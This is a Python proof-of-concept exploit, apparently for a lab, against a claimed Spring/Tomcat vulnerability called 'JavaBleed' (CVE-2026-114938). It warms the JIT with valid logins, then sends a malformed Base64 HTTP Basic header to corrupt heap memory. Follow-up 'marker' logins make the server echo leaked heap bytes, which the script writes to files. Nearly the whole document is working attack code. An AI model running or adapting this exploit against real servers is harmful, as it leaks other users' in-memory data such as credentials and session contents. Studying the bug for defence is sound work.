#!/usr/bin/env python3
"""JavaBleed over HTTP Basic — CVE-2026-114938 → heap disclosure on the Spring lab.

Sequencing (public PoC technique, adapted):
  single keep-alive connection → same Tomcat worker thread → sequential TLAB allocations.
  [trigger login: b64 text "A"*64+"=" → 50B dst in 64B thread-local scratch
   → intrinsic underflow → full 64B mask write at dst+48 → 48B past scratch
   → corrupts the NEXT TLAB allocation = next request's username byte[]]
  → next marker login echoes its username in the 401 body → response carries
    heap bytes past the marker = disclosure.
"""
import http.client, sys, time

HOST, PORT = "127.0.0.1", 8080
TRIGGER_B64 = "A" * 64 + "="

conn = http.client.HTTPConnection(HOST, PORT, timeout=10)

def login(b64text):
    conn.request("GET", "/api/login", headers={"Authorization": "Basic " + b64text})
    r = conn.getresponse()
    body = r.read()
    return r.status, body

def marker_login(n):
    user = ("MARK%04d" % n).encode()          # 8B username
    cred = user + b":pass"
    return login(base64.b64encode(cred).decode())

import base64
if __name__ == "__main__":
    warm = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
    probes = int(sys.argv[2]) if len(sys.argv) > 2 else 12

    print("═══ JavaBleed over HTTP Basic — Spring lab ═══", flush=True)

    # Phase 0: overflow sanity on OUR side is impossible; rely on victim-side behavior.
    # Phase 1: warm — C2 compiles the intrinsic on THIS Tomcat worker thread
    print("[W] warm %d valid logins..." % warm, flush=True)
    valid = base64.b64encode(b"admin:admin").decode()
    for i in range(warm):
        s, b = login(valid)
        if s != 200:
            print("[W] warm request failed at %d: %s" % (i, s), flush=True)
            sys.exit(2)
    print("[W] warm done", flush=True)

    # Phase 2: baseline marker echoes (expected body length)
    s, b = marker_login(9999)
    base_len = len(b)
    print("[B] baseline marker echo: %d bytes — %r" % (base_len, b), flush=True)

    # Phase 3: TRIGGER — malformed 65-char b64 in Basic credentials
    print("[T] firing trigger: Authorization: Basic %s..." % TRIGGER_B64[:30], flush=True)
    s, b = login(TRIGGER_B64)
    print("[T] trigger response: HTTP %s %r" % (s, b[:80]), flush=True)

    # Phase 4: BLEED — subsequent marker logins echo corrupted-username byte[]
    best = None
    for n in range(probes):
        s, b = marker_login(n)
        exp = base_len
        if len(b) > exp + 8:
            print("★★★ BLEED at probe %d: %d bytes (expected %d) — +%d heap bytes ★★★"
                  % (n, len(b), exp, len(b) - exp), flush=True)
            head = b[:400]
            print("[B] body head: %r" % head, flush=True)
            open("/tmp/bleed_%d.bin" % n, "wb").write(b)
            best = (n, b)
        else:
            print("[P] probe %d: %d bytes (normal)" % (n, len(b)), flush=True)
        # re-trigger every few probes (TLAB bump moves forward each request)
        if n in (3, 6, 9):
            s, b = login(TRIGGER_B64)

    if best:
        n, data = best
        print("VERDICT: JAVABLEED (probe %d) — heap disclosure via corrupted username echo" % n, flush=True)
        sys.exit(43)
    print("VERDICT: NO-BLEED (trigger fired but no corrupted echo observed)", flush=True)
    sys.exit(0)
